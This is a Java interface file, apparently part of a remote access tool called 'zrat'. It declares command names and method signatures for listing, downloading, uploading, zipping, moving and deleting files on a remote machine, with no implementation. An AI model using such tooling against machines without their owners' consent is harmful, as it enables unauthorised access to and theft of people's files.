package com.zrat.client.controller;

import java.io.File;
import java.util.List;

import com.zrat.transfer.model.RemoteFile;


public interface FileService {
	public static final String COMMAND_SHOWROOTS = "showRoots";
	public static final String COMMAND_SHOWFILES = "showFiles";
	public static final String COMMAND_CREATEFILE = "createFile";
	public static final String COMMAND_CREATEDIRECTORY = "createDirectory";
	public static final String COMMAND_DELETEFILE = "deleteFile";
	public static final String COMMAND_DOWNLOAD = "downloadFile";
	public static final String COMMAND_DOWNLOAD_BYTE = "fileByte";
	public static final String COMMAND_ZIPFILE = "zipFile";
	public static final String COMMAND_UNZIPFILE = "unzipFile";
	public static final String COMMAND_CUTFILE = "cutFile";
	public static final String COMMAND_COPYFILE = "copyFile";
	public static final String COMMAND_UPLOADFILE = "uploadFile";
	public final static String  DOWNLOADDIC = "download";
	
	public void copyFile(String fileName, String targetPath);
	public void cutFile(String fileName, String targetPath);
	public void unZipFile(String path);
	public void zipFile(String path);
	public void getRoots() ;
	public void getFiles(String path) ;
	public void createDic(String path,String fileName);
	public void createFile(String path,String fileName);
	public void download(List<RemoteFile> remoteFile);
	public void download(String remoteFile,long size);
	public void deleteFile(List<RemoteFile> files);
	public void uploadFile(String file, String path,String string, long size);
	public void uploadFile(File[] files, String path);
	

}
